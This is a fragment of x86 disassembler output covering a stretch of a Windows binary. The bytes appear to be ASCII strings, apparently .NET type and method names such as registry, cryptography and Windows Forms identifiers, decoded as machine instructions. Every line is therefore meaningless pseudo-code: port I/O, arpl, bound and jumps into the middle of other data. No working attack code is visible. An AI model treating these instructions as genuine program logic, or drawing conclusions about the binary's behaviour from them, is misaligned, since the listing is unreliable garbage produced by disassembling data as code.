  408e93:	gs ins DWORD PTR es:[edi],dx
  408e95:	outs   dx,DWORD PTR ds:[esi]
  408e96:	je     0x408f01
  408e98:	outs   dx,BYTE PTR ds:[esi]
  408e99:	add    BYTE PTR [bp+di+0x79],dl
  408e9d:	jae    0x408f13
  408e9f:	gs ins DWORD PTR es:[edi],dx
  408ea1:	push   edi
  408ea2:	imul   ebp,DWORD PTR [esi+0x64],0x4673776f
  408ea9:	outs   dx,DWORD PTR ds:[esi]
  408eaa:	jb     0x408f19
  408eac:	jae    0x408eae
  408eae:	push   ebx
  408eaf:	jns    0x408f24
  408eb1:	je     0x408f18
  408eb3:	ins    DWORD PTR es:[edi],dx
  408eb4:	pop    eax
  408eb5:	ins    DWORD PTR es:[edi],dx
  408eb6:	ins    BYTE PTR es:[edi],dx
  408eb7:	add    BYTE PTR [ebp+0x69],cl
  408eba:	arpl   WORD PTR [edx+0x6f],si
  408ebd:	jae    0x408f2e
  408ebf:	data16 je 0x408f12
  408ec2:	jne    0x408f26
  408ec4:	ins    BYTE PTR es:[edi],dx
  408ec5:	imul   esp,DWORD PTR [ebx+0x4b],0x4d007965
  408ecc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  408ed3:	je     0x408f25
  408ed5:	jne    0x408f39
  408ed7:	ins    BYTE PTR es:[edi],dx
  408ed8:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408edf:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  408ee3:	dec    ebp
  408ee4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  408eeb:	je     0x408f3d
  408eed:	jne    0x408f51
  408eef:	ins    BYTE PTR es:[edi],dx
  408ef0:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  408ef7:	ins    BYTE PTR es:[edi],dx
  408ef8:	ins    BYTE PTR es:[edi],dx
  408ef9:	add    BYTE PTR [ebx+0x68],dl
  408efc:	popa   
  408efd:	jb     0x408f64
  408eff:	fs dec esp
  408f01:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  408f08:	arpl   WORD PTR [ebx+0x65],cx
  408f0b:	jns    0x408f0d
  408f0d:	push   ebx
  408f0e:	push   0x64657261
  408f13:	dec    esp
  408f14:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  408f1b:	arpl   WORD PTR [ebx+0x65],cx
  408f1e:	jns    0x408f74
  408f20:	outs   dx,DWORD PTR ds:[esi]
  408f21:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  408f25:	push   ebx
  408f26:	push   0x64657261
  408f2b:	dec    esp
  408f2c:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  408f33:	arpl   WORD PTR [ebx+0x65],cx
  408f36:	jns    0x408f7e
  408f38:	jne    0x408fa6
  408f3a:	ins    BYTE PTR es:[edi],dx
  408f3b:	add    BYTE PTR [ebx+0x79],dl
  408f3e:	jae    0x408fb4
  408f40:	gs ins DWORD PTR es:[edi],dx
  408f42:	inc    ebx
  408f43:	outs   dx,DWORD PTR ds:[esi]
  408f44:	ins    DWORD PTR es:[edi],dx
  408f45:	jo     0x408fb6
  408f47:	outs   dx,BYTE PTR ds:[esi]
  408f48:	outs   dx,BYTE PTR gs:[esi]
  408f4a:	je     0x408f99
  408f4c:	outs   dx,DWORD PTR ds:[esi]
  408f4d:	fs gs ins BYTE PTR es:[edi],dx
  408f50:	inc    esp
  408f51:	popa   
  408f52:	je     0x408fb5
  408f54:	inc    ecx
  408f55:	outs   dx,BYTE PTR ds:[esi]
  408f56:	outs   dx,BYTE PTR ds:[esi]
  408f57:	outs   dx,DWORD PTR ds:[esi]
  408f58:	je     0x408fbb
  408f5a:	je     0x408fc5
  408f5c:	outs   dx,DWORD PTR ds:[esi]
  408f5d:	outs   dx,BYTE PTR ds:[esi]
  408f5e:	jae    0x408f60
  408f60:	push   ebx
  408f61:	jns    0x408fd6
  408f63:	je     0x408fca
  408f65:	ins    DWORD PTR es:[edi],dx
  408f66:	inc    ebx
  408f67:	outs   dx,DWORD PTR ds:[esi]
  408f68:	outs   dx,BYTE PTR ds:[esi]
  408f69:	imul   sp,WORD PTR [edi+0x75],0x6172
  408f6f:	je     0x408fda
  408f71:	outs   dx,DWORD PTR ds:[esi]
  408f72:	outs   dx,BYTE PTR ds:[esi]
  408f73:	add    BYTE PTR [ebx+0x79],dl
  408f76:	jae    0x408fec
  408f78:	gs ins DWORD PTR es:[edi],dx
  408f7a:	inc    ebx
  408f7b:	outs   dx,DWORD PTR ds:[esi]
  408f7c:	outs   dx,BYTE PTR ds:[esi]
  408f7d:	imul   sp,WORD PTR [edi+0x75],0x6172
  408f83:	je     0x408fee
  408f85:	outs   dx,DWORD PTR ds:[esi]
  408f86:	outs   dx,BYTE PTR ds:[esi]
  408f87:	dec    ecx
  408f88:	outs   dx,BYTE PTR ds:[esi]
  408f89:	jae    0x408fff
  408f8b:	popa   
  408f8c:	ins    BYTE PTR es:[edi],dx
  408f8d:	ins    BYTE PTR es:[edi],dx
  408f8e:	add    BYTE PTR [ebx+0x79],dl
  408f91:	jae    0x409007
  408f93:	gs ins DWORD PTR es:[edi],dx
  408f95:	inc    esp
  408f96:	gs jo  0x409005
  408f99:	outs   dx,DWORD PTR ds:[esi]
  408f9a:	jns    0x409009
  408f9c:	outs   dx,BYTE PTR gs:[esi]
  408f9e:	je     0x408fa0
  408fa0:	push   ebx
  408fa1:	jns    0x409016
  408fa3:	je     0x40900a
  408fa5:	ins    DWORD PTR es:[edi],dx
  408fa6:	inc    esp
  408fa7:	gs jae 0x409013
  408faa:	outs   dx,BYTE PTR ds:[si]
  408fac:	add    BYTE PTR [ebx+0x79],dl
  408faf:	jae    0x409025
  408fb1:	gs ins DWORD PTR es:[edi],dx
  408fb3:	inc    esp
  408fb4:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408fbb:	jns    0x409010
  408fbd:	gs jb  0x409036
  408fc0:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  408fc7:	jae    0x40903d
  408fc9:	gs ins DWORD PTR es:[edi],dx
  408fcb:	inc    esp
  408fcc:	jb     0x40902f
  408fce:	ja     0x409039
  408fd0:	outs   dx,BYTE PTR ds:[esi]
  408fd1:	addr16 inc esp
  408fd3:	gs jae 0x40903f
  408fd6:	outs   dx,BYTE PTR ds:[si]
  408fd8:	add    BYTE PTR [ebx+0x79],dl
  408fdb:	jae    0x409051
  408fdd:	gs ins DWORD PTR es:[edi],dx
  408fdf:	inc    esp
  408fe0:	jb     0x409043
  408fe2:	ja     0x40904d
  408fe4:	outs   dx,BYTE PTR ds:[esi]
  408fe5:	add    BYTE PTR [bp+di+0x79],dl
  408fe9:	jae    0x40905f
  408feb:	gs ins DWORD PTR es:[edi],dx
  408fed:	inc    ebp
  408fee:	outs   dx,BYTE PTR ds:[esi]
  408fef:	je     0x409056
  408ff1:	jb     0x409063
  408ff3:	jb     0x40905e
  408ff5:	jae    0x40905c
  408ff7:	push   ebx
  408ff8:	gs jb  0x409071
  408ffb:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  409002:	jae    0x409078
  409004:	gs ins DWORD PTR es:[edi],dx
  409006:	dec    ebp
  409007:	popa   
  409008:	outs   dx,BYTE PTR ds:[esi]
  409009:	popa   
  40900a:	gs ins DWORD PTR es:[di],dx
  40900d:	outs   dx,BYTE PTR gs:[esi]
  40900f:	je     0x409011
  409011:	push   ebx
  409012:	jns    0x409087
  409014:	je     0x40907b
  409016:	ins    DWORD PTR es:[edi],dx
  409017:	dec    ebp
  409018:	gs jae 0x40908e
  40901b:	popa   
  40901c:	imul   ebp,DWORD PTR [bp+0x67],0x73795300
  409024:	je     0x40908b
  409026:	ins    DWORD PTR es:[edi],dx
  409027:	push   edx
  409028:	jne    0x409098
  40902a:	je     0x409095
  40902c:	ins    DWORD PTR es:[edi],dx
  40902d:	gs push ebx
  40902f:	gs jb  0x40909b
  409032:	popa   
  409033:	ins    BYTE PTR es:[edi],dx
  409034:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  40903b:	inc    esi
  40903c:	outs   dx,DWORD PTR ds:[esi]
  40903d:	jb     0x4090ac
  40903f:	popa   
  409040:	je     0x4090b6
  409042:	gs jb  0x4090b8
  409045:	push   ebx
  409046:	outs   dx,DWORD PTR ds:[esi]
  409047:	popa   
  409048:	jo     0x40904a
  40904a:	push   ebx
  40904b:	jns    0x4090c0
  40904d:	je     0x4090b4
  40904f:	ins    DWORD PTR es:[edi],dx
  409050:	push   ebx
  409051:	arpl   WORD PTR gs:[ebp+0x72],si
  409055:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74737953
  40905d:	gs ins DWORD PTR es:[edi],dx
  40905f:	push   ebx
  409060:	gs jb  0x4090d9
  409063:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  40906a:	gs jae 0x4090e0
  40906d:	add    BYTE PTR [ebx+0x79],dl
  409070:	jae    0x4090e6
  409072:	gs ins DWORD PTR es:[edi],dx
  409074:	push   edi
  409075:	bound  eax,QWORD PTR gs:[eax]
  409078:	push   ebx
  409079:	jns    0x4090ee
  40907b:	je     0x4090e2
  40907d:	ins    DWORD PTR es:[edi],dx
  40907e:	push   edi
  40907f:	bound  eax,QWORD PTR gs:[ecx+0x62]
  409083:	jae    0x4090f9
  409085:	jb     0x4090e8
  409087:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40908b:	outs   dx,BYTE PTR ds:[esi]
  40908c:	jae    0x40908e
  40908e:	push   ebx
  40908f:	jns    0x409104
  409091:	je     0x4090f8
  409093:	ins    DWORD PTR es:[edi],dx
  409094:	push   edi
  409095:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  40909a:	popa   
  40909b:	ins    DWORD PTR es:[edi],dx
  40909c:	imul   esp,DWORD PTR [ebx+0x44],0x617461
  4090a3:	push   ebx
  4090a4:	jns    0x409119
  4090a6:	je     0x40910d
  4090a8:	ins    DWORD PTR es:[edi],dx
  4090a9:	push   edi
  4090aa:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  4090af:	popa   
  4090b0:	ins    DWORD PTR es:[edi],dx
  4090b1:	imul   esp,DWORD PTR [ebx+0x44],0x44617461
  4090b8:	gs jae 0x409124
  4090bb:	outs   dx,BYTE PTR ds:[si]
  4090bd:	add    BYTE PTR [ebx+0x79],dl
  4090c0:	jae    0x409136
  4090c2:	gs ins DWORD PTR es:[edi],dx
  4090c4:	push   edi
  4090c5:	bound  eax,QWORD PTR gs:[ebp+0x6e]
  4090c9:	je     0x409134
  4090cb:	je     0x409146
  4090cd:	inc    esp
  4090ce:	gs jae 0x40913a
  4090d1:	outs   dx,BYTE PTR ds:[si]
  4090d3:	add    BYTE PTR [ebx+0x79],dl
  4090d6:	jae    0x40914c
  4090d8:	gs ins DWORD PTR es:[edi],dx
  4090da:	push   edi
  4090db:	bound  eax,QWORD PTR gs:[ebp+0x78]
  4090df:	je     0x409146
  4090e1:	outs   dx,BYTE PTR ds:[esi]
  4090e2:	jae    0x40914d
  4090e4:	outs   dx,DWORD PTR ds:[esi]
  4090e5:	outs   dx,BYTE PTR ds:[esi]
  4090e6:	jae    0x4090e8
  4090e8:	push   ebx
  4090e9:	jns    0x40915e
  4090eb:	je     0x409152
  4090ed:	ins    DWORD PTR es:[edi],dx
  4090ee:	push   edi
  4090ef:	bound  eax,QWORD PTR gs:[ebp+0x78]
  4090f3:	je     0x40915a
  4090f5:	outs   dx,BYTE PTR ds:[esi]
  4090f6:	jae    0x409161
  4090f8:	outs   dx,DWORD PTR ds:[esi]
  4090f9:	outs   dx,BYTE PTR ds:[esi]
  4090fa:	jae    0x409140
  4090fc:	gs jae 0x409168
  4090ff:	outs   dx,BYTE PTR ds:[si]
  409101:	add    BYTE PTR [ebx+0x79],dl
  409104:	jae    0x40917a
  409106:	gs ins DWORD PTR es:[edi],dx
  409108:	push   edi
  409109:	bound  ecx,QWORD PTR gs:[ebp+0x6f]
  40910d:	bound  ebp,QWORD PTR [ecx+0x6c]
  409110:	add    BYTE PTR gs:[ebx+0x79],dl
  409114:	jae    0x40918a
  409116:	gs ins DWORD PTR es:[edi],dx
  409118:	push   edi
  409119:	bound  edx,QWORD PTR gs:[edx+0x65]
  40911d:	addr16 jne 0x40918c
  409120:	popa   
  409121:	jb     0x409168
  409123:	js     0x409195
  409125:	jb     0x40918c
  409127:	jae    0x40919c
  409129:	imul   ebp,DWORD PTR [edi+0x6e],0x79530073
  409130:	jae    0x4091a6
  409132:	gs ins DWORD PTR es:[edi],dx
  409134:	push   edi
  409135:	bound  edx,QWORD PTR gs:[edx+0x6f]
  409139:	jne    0x4091af
  40913b:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  409142:	je     0x4091a9
  409144:	ins    DWORD PTR es:[edi],dx
  409145:	push   edi
  409146:	bound  edx,QWORD PTR gs:[ebx+0x65]
  40914a:	jb     0x4091c2
  40914c:	imul   esp,DWORD PTR [ebx+0x65],0x694d0073
  409153:	arpl   WORD PTR [edx+0x6f],si
  409156:	jae    0x4091c7
  409158:	data16 je 0x4091b1
  40915b:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  409162:	jne    0x4091c8
  409164:	imul   ebp,DWORD PTR [edi+0x0],0x7263694d
  40916b:	outs   dx,DWORD PTR ds:[esi]
  40916c:	jae    0x4091dd
  40916e:	data16 je 0x4091c7
  409171:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  409178:	jne    0x4091de
  40917a:	imul   ebp,DWORD PTR [edi+0x57],0x6f646e69
  409181:	ja     0x4091f6
  409183:	inc    esi
  409184:	outs   dx,DWORD PTR ds:[esi]
  409185:	jb     0x4091f4
  409187:	jae    0x409189
  409189:	push   esi
  40918a:	dec    edx
  40918b:	push   ebx
  40918c:	push   0x43707261
  409191:	outs   dx,DWORD PTR ds:[esi]
  409192:	fs gs push eax
  409195:	jb     0x409206
  409197:	jbe    0x409202
  409199:	fs gs jb 0x40919d
  40919d:	inc    ecx
  40919e:	push   ebx
  40919f:	push   eax
  4091a0:	inc    edx
  4091a1:	jb     0x409212
  4091a3:	ja     0x409218
  4091a5:	gs jb  0x4091eb
  4091a8:	popa   
  4091a9:	jo     0x40921e
  4091ab:	push   eax
  4091ac:	jne    0x409210
  4091ae:	ins    BYTE PTR es:[edi],dx
  4091af:	imul   esp,DWORD PTR [ebx+0x4b],0x41007965
  4091b6:	push   ebx
  4091b7:	push   eax
  4091b8:	inc    edx
  4091b9:	jb     0x40922a
  4091bb:	ja     0x409230
  4091bd:	gs jb  0x409203
  4091c0:	popa   
  4091c1:	jo     0x409236
  4091c3:	inc    esi
  4091c4:	popa   
  4091c5:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4091c9:	jns    0x4091cb
  4091cb:	dec    ebp
  4091cc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4091d3:	je     0x40922b
  4091d5:	push   ebx
  4091d6:	inc    esp
  4091d7:	gs jae 0x409243
  4091da:	outs   dx,BYTE PTR ds:[si]
  4091dc:	gs jb  0x4091df
  4091df:	dec    ebp
  4091e0:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4091e7:	je     0x40923f
  4091e9:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4091f0:	jne    0x409256
  4091f2:	imul   ebp,DWORD PTR [edi+0x57],0x4d006265
  4091f9:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  409200:	je     0x409259
  409202:	bound  eax,QWORD PTR gs:[ebp+eiz*2+0x73]
  409207:	imul   esp,DWORD PTR [edi+0x6e],0x63694d00
  40920e:	jb     0x40927f
  409210:	jae    0x409281
  409212:	data16 je 0x40926b
  409215:	push   ebx
  409216:	inc    esp
  409217:	gs jae 0x409283
  40921a:	outs   dx,BYTE PTR ds:[si]
  40921c:	gs jb  0x40926c
  40921f:	outs   dx,DWORD PTR ds:[esi]
  409220:	bound  ebp,QWORD PTR [ecx+0x6c]
  409223:	add    BYTE PTR gs:[ebp+0x69],cl
  409227:	arpl   WORD PTR [edx+0x6f],si
  40922a:	jae    0x40929b
  40922c:	data16 je 0x409279
  40922f:	push   ebx
  409230:	arpl   WORD PTR [edx+0x69],si
  409233:	jo     0x4092a9
  409235:	add    BYTE PTR [edx+0x65],dh
  409238:	jo     0x4092a6
  40923a:	popa   
  40923b:	arpl   WORD PTR [ebp+0x64],sp
  40923e:	add    BYTE PTR [edi+0x65],al
  409241:	je     0x40928f
  409243:	outs   dx,DWORD PTR ds:[esi]
  409244:	arpl   WORD PTR [ecx+0x6c],sp
  409247:	imul   edi,DWORD PTR [edx+0x65],0x72745364
  40924e:	imul   ebp,DWORD PTR [esi+0x67],0x616f6c00
  409255:	fs gs jb 0x409259
  409259:	push   ebx
  40925a:	jns    0x4092cf
  40925c:	je     0x4092c3
  40925e:	ins    DWORD PTR es:[edi],dx
  40925f:	cs push edx
  409261:	gs jae 0x4092d3
  409264:	jne    0x4092d8
  409266:	arpl   WORD PTR [ebp+0x73],sp
  409269:	add    BYTE PTR [edx+0x65],dl
  40926c:	jae    0x4092dd
  40926e:	jne    0x4092e2
  409270:	arpl   WORD PTR [ebp+0x4d],sp
  409273:	popa   
  409274:	outs   dx,BYTE PTR ds:[esi]
  409275:	popa   
  409276:	addr16 gs jb 0x40927a
  40927a:	jb     0x4092e1
  40927c:	jae    0x4092ed
  40927e:	jne    0x4092f2
  409280:	arpl   WORD PTR [ebp+0x73],sp
  409283:	add    BYTE PTR [edi+0x65],al
  409286:	je     0x4092d4
  409288:	outs   dx,DWORD PTR ds:[esi]
  409289:	popa   
  40928a:	fs gs jb 0x40928e
  40928e:	push   ebx
  40928f:	jns    0x409304
  409291:	je     0x4092f8
  409293:	ins    DWORD PTR es:[edi],dx
  409294:	cs inc edi
  409296:	ins    BYTE PTR es:[edi],dx
  409297:	outs   dx,DWORD PTR ds:[esi]
  409298:	bound  esp,QWORD PTR [ecx+0x6c]
  40929b:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4092a2:	add    BYTE PTR [ebx+0x75],al
  4092a5:	ins    BYTE PTR es:[edi],dx
  4092a6:	je     0x40931d
  4092a8:	jb     0x40930f
  4092aa:	dec    ecx
  4092ab:	outs   dx,BYTE PTR ds:[esi]
  4092ac:	outs   dx,WORD PTR ds:[esi]
  4092ae:	add    BYTE PTR [edi+0x65],ah
  4092b1:	je     0x409312
  4092b3:	inc    ebx
  4092b4:	jne    0x409322
  4092b6:	je     0x40932d
  4092b8:	jb     0x40931f
  4092ba:	add    BYTE PTR [edi+0x65],al
  4092bd:	je     0x409312
  4092bf:	je     0x409333
  4092c1:	imul   ebp,DWORD PTR [esi+0x67],0x6c754300
  4092c8:	je     0x40933f
  4092ca:	jb     0x409331
  4092cc:	add    BYTE PTR [esi+0x61],ch
  4092cf:	ins    DWORD PTR es:[edi],dx
  4092d0:	add    BYTE PTR gs:[ebp+eiz*2+0x73],ah
  4092d5:	arpl   WORD PTR [edx+0x69],si
  4092d8:	jo     0x40934e
  4092da:	imul   ebp,DWORD PTR [edi+0x6e],0x6f736552
  4092e1:	jne    0x409355
  4092e3:	arpl   WORD PTR [ebp+0x4e],sp
  4092e6:	popa   
  4092e7:	ins    DWORD PTR es:[edi],dx
  4092e8:	add    BYTE PTR gs:[esi+0x61],dh
  4092ec:	ins    BYTE PTR es:[edi],dx
  4092ed:	jne    0x409354
  4092ef:	dec    esi
  4092f0:	popa   
  4092f1:	ins    DWORD PTR es:[edi],dx
  4092f2:	gs push edx
  4092f4:	gs jae 0x409366
  4092f7:	jne    0x40936b
  4092f9:	arpl   WORD PTR [ebp+0x4e],sp
  4092fc:	popa   
  4092fd:	ins    DWORD PTR es:[edi],dx
  4092fe:	add    BYTE PTR gs:[ecx+0x73],ch
  409302:	push   edx
  409303:	gs jno 0x40937b
  409306:	imul   esi,DWORD PTR [edx+0x65],0x68730064
  40930d:	outs   dx,DWORD PTR ds:[esi]
  40930e:	jb     0x409384
  409310:	inc    esi
  409311:	outs   dx,DWORD PTR ds:[esi]
  409312:	jb     0x409381
  409314:	add    BYTE PTR [ecx+0x73],ch
  409317:	push   ebx
  409318:	ja     0x409383
  40931a:	je     0x40937f
  40931c:	push   0x796c6e4f
  409321:	add    BYTE PTR [esi+0x61],dh
  409324:	ins    BYTE PTR es:[edi],dx
  409325:	jne    0x40938c
  409327:	push   edi
  409328:	push   0x77536e65
  40932d:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x72507349
  409335:	gs jae 0x40939d
  409338:	outs   dx,BYTE PTR ds:[esi]
  409339:	je     0x40933b
  40933b:	jo     0x4093a6
  40933d:	add    BYTE PTR [ecx+0x74],ah
  409340:	je     0x4093b4
  409342:	imul   esp,DWORD PTR [edx+0x75],0x69006574
  409349:	outs   dx,BYTE PTR ds:[esi]
  40934a:	jae    0x4093c0
  40934c:	popa   
  40934d:	outs   dx,BYTE PTR ds:[esi]
  40934e:	arpl   WORD PTR [ebp+0x0],sp
  409351:	jbe    0x4093b4
  409353:	ins    BYTE PTR es:[edi],dx
  409354:	jne    0x4093bb
  409356:	add    BYTE PTR [ecx+0x72],ah
  409359:	addr16 jae 0x40935c
  40935c:	popa   
  40935d:	jb     0x4093c6
  40935f:	add    BYTE PTR [ebx+0x79],dl
  409362:	jae    0x4093d8
  409364:	gs ins DWORD PTR es:[edi],dx
  409366:	cs push edx
  409368:	jne    0x4093d8
  40936a:	je     0x4093d5
  40936c:	ins    DWORD PTR es:[edi],dx
  40936d:	gs cs dec ecx
  409370:	outs   dx,BYTE PTR ds:[esi]
  409371:	je     0x4093d8
  409373:	jb     0x4093e4
  409375:	jo     0x4093ca
  409377:	gs jb  0x4093f0
  40937a:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  409381:	je     0x4093c4
  409383:	je     0x4093f9
  409385:	jb     0x4093f0
  409387:	bound  esi,QWORD PTR [ebp+0x74]
  40938a:	add    BYTE PTR gs:[ecx+0x72],ah
  40938e:	addr16 jne 0x4093fe
  409391:	outs   dx,BYTE PTR gs:[esi]
  409393:	je     0x4093dd
  409395:	gs ins BYTE PTR es:[edi],dx
  409397:	jo     0x4093de
  409399:	outs   dx,BYTE PTR ds:[esi]
  40939a:	je     0x40940e
  40939c:	imul   esp,DWORD PTR [ebp+0x73],0x78616d00
  4093a3:	dec    esi
  4093a4:	popa   
  4093a5:	ins    DWORD PTR es:[edi],dx
  4093a6:	gs dec esp
  4093a8:	outs   dx,BYTE PTR gs:[esi]
  4093aa:	addr16 je 0x409415
  4093ad:	add    BYTE PTR [esi+0x69],ah
  4093b0:	jb     0x409425
  4093b2:	je     0x409400
  4093b4:	imul   ebp,DWORD PTR [esi+0x65],0x64646150
  4093bb:	imul   ebp,DWORD PTR [esi+0x67],0x73657200
  4093c2:	je     0x409413
  4093c4:	dec    sp
  4093c6:	imul   ebp,DWORD PTR [esi+0x65],0x64615073
  4093cd:	imul   ebp,DWORD PTR fs:[esi+0x67],0x72696600
  4093d5:	jae    0x40944b
  4093d7:	dec    esp
  4093d8:	imul   ebp,DWORD PTR [esi+0x65],0x74646957
  4093df:	push   0x73657200
  4093e4:	je     0x409435
  4093e6:	dec    sp
  4093e8:	imul   ebp,DWORD PTR [esi+0x65],0x64695773
  4093ef:	je     0x409459
  4093f1:	add    BYTE PTR [ebp+0x65],ch
  4093f4:	jae    0x409469
  4093f6:	popa   
  4093f7:	add    BYTE PTR gs:[bp+0x75],ah
  4093fc:	ins    BYTE PTR es:[edi],dx
  4093fd:	ins    BYTE PTR es:[edi],dx
  4093fe:	push   edi
  4093ff:	imul   esp,DWORD PTR [esp+esi*2+0x68],0x756e6500
  409407:	ins    DWORD PTR es:[edi],dx
  409408:	push   esi
  409409:	popa   
  40940a:	ins    BYTE PTR es:[edi],dx
  40940b:	jne    0x409472
  40940d:	add    BYTE PTR [edx+0x65],dh
  409410:	jae    0x409481
  409412:	jne    0x409486
  409414:	arpl   WORD PTR [ebp+0x4e],sp
  409417:	popa   
  409418:	ins    DWORD PTR es:[edi],dx
  409419:	add    BYTE PTR gs:[edi+0x72],ch
  40941d:	imul   ebp,DWORD PTR fs:[esi+0x61],0x7473006c
  409425:	jb     0x409490
  409427:	outs   dx,BYTE PTR ds:[esi]
  409428:	addr16 push esi
  40942a:	popa   
  40942b:	ins    BYTE PTR es:[edi],dx
  40942c:	jne    0x409493
  40942e:	add    BYTE PTR [ebx+0x6f],dh
  409431:	jne    0x4094a5
  409433:	arpl   WORD PTR [ebp+0x0],sp
  409436:	ins    DWORD PTR es:[edi],dx
  409437:	popa   
  409438:	js     0x409491
  40943a:	imul   esp,DWORD PTR [esp+esi*2+0x68],0x646e6900
  409442:	gs js  0x409445
  409445:	jae    0x4094bb
  409447:	popa   
  409448:	jb     0x4094be
  40944a:	dec    ecx
  40944b:	outs   dx,BYTE PTR ds:[esi]
  40944c:	fs gs js 0x409450
  409450:	outs   dx,BYTE PTR gs:[esi]
  409452:	fs dec ecx
  409454:	outs   dx,BYTE PTR ds:[esi]
  409455:	fs gs js 0x409459
  409459:	fs gs jae 0x4094c0
  40945d:	jb     0x4094c8
  40945f:	jo     0x4094d5
  409461:	imul   ebp,DWORD PTR [edi+0x6e],0x61786500
  409468:	ins    DWORD PTR es:[edi],dx
  409469:	jo     0x4094d7
  40946b:	add    BYTE PTR gs:[ecx+0x72],ah
  40946f:	addr16 jne 0x4094df
  409472:	outs   dx,BYTE PTR gs:[esi]
  409474:	je     0x4094c4
  409476:	popa   
  409477:	ins    DWORD PTR es:[edi],dx
  409478:	add    BYTE PTR gs:[ebp+0x78],ah
  40947c:	jo     0x4094df
  40947e:	outs   dx,BYTE PTR ds:[esi]
  40947f:	jae    0x4094ea
  409481:	outs   dx,DWORD PTR ds:[esi]
  409482:	outs   dx,BYTE PTR ds:[esi]
  409483:	inc    ebp
  409484:	js     0x4094fa
  409486:	outs   dx,BYTE PTR gs:[esi]
  409488:	jae    0x4094f3
  40948a:	outs   dx,DWORD PTR ds:[esi]
  40948b:	outs   dx,BYTE PTR ds:[esi]
  40948c:	add    BYTE PTR [ecx+0x6c],ah
  40948f:	je     0x4094f6
  409491:	jb     0x409501
  409493:	popa   
  409494:	je     0x4094fb
  409496:	inc    esi
  409497:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  40949f:	jae    0x40950a
  4094a1:	outs   dx,DWORD PTR ds:[esi]
  4094a2:	outs   dx,BYTE PTR ds:[esi]
  4094a3:	add    BYTE PTR [ecx+0x74],ch
  4094a6:	gs ins DWORD PTR es:[edi],dx
  4094a8:	add    BYTE PTR [ecx+0x72],ah
  4094ab:	jb     0x40950e
  4094ad:	jns    0x4094af
  4094af:	popa   
  4094b0:	jb     0x409524
  4094b2:	popa   
  4094b3:	jns    0x4094fe
  4094b5:	outs   dx,BYTE PTR ds:[esi]
  4094b6:	fs gs js 0x4094ba
  4094ba:	arpl   WORD PTR [ebx+0x64],si
  4094bd:	ins    BYTE PTR es:[edi],dx
  4094be:	inc    esi
  4094bf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6f727265
  4094c7:	jb     0x40953c
  4094c9:	add    BYTE PTR [ebx+0x65],dh
  4094cc:	jbe    0x409533
  4094ce:	jb     0x409539
  4094d0:	je     0x40954b
  4094d2:	add    BYTE PTR [edi+0x61],dh
  4094d5:	jb     0x409545
  4094d7:	imul   ebp,DWORD PTR [esi+0x67],0x6e756f43
  4094de:	je     0x4094e0
  4094e0:	gs jb  0x409555
  4094e3:	outs   dx,DWORD PTR ds:[esi]
  4094e4:	jb     0x409529
  4094e6:	outs   dx,DWORD PTR ds:[esi]
  4094e7:	jne    0x409557
  4094e9:	je     0x4094eb
  4094eb:	gs jb  0x409560
  4094ee:	outs   dx,DWORD PTR ds:[esi]
  4094ef:	jb     0x4094f1
  4094f1:	imul   bp,WORD PTR [ebp+eiz*2+0x50],0x7461
  4094f8:	push   0x6e696c00
  4094fd:	add    BYTE PTR gs:[ebx+0x6f],ah
  409501:	ins    BYTE PTR es:[edi],dx
  409502:	jne    0x409571
  409504:	outs   dx,BYTE PTR ds:[esi]
  409505:	add    BYTE PTR [ebp+0x72],ah
  409508:	jb     0x409579
  40950a:	jb     0x40954f
  40950c:	outs   dx,DWORD PTR ds:[esi]
  40950d:	fs add BYTE PTR gs:[ebp+0x78],ah
  409512:	add    BYTE PTR [ecx+0x72],ah
  409515:	addr16 jne 0x409585
  409518:	outs   dx,BYTE PTR gs:[esi]
  40951a:	je     0x409572
  40951c:	popa   
  40951d:	ins    BYTE PTR es:[edi],dx
  40951e:	jne    0x409585
  409520:	jae    0x409522
  409522:	jbe    0x409585
  409524:	ins    BYTE PTR es:[edi],dx
  409525:	imul   esp,DWORD PTR [ebp+eax*2+0x78],0x736e6574
  40952d:	imul   ebp,DWORD PTR [edi+0x6e],0x74657300
  409534:	je     0x40959f
  409536:	outs   dx,BYTE PTR ds:[esi]
  409537:	addr16 dec esi
  409539:	popa   
  40953a:	ins    DWORD PTR es:[edi],dx
  40953b:	add    BYTE PTR gs:[ebp+eiz*2+0x66],ah
  409540:	popa   
  409541:	jne    0x4095af
  409543:	je     0x40958e
  409545:	dec    si
  409547:	outs   dx,DWORD PTR ds:[esi]
  409548:	je     0x40958b
  40954a:	jbe    0x4095ad
  40954c:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x7000656c
  409554:	xor    BYTE PTR [eax],al
  409556:	jo     0x409589
  409558:	add    BYTE PTR [eax+0x32],dh
  40955b:	add    BYTE PTR [eax+0x61],dh
  40955e:	jb     0x4095c1
  409560:	ins    DWORD PTR es:[edi],dx
  409561:	dec    esi
  409562:	popa   
  409563:	ins    DWORD PTR es:[edi],dx
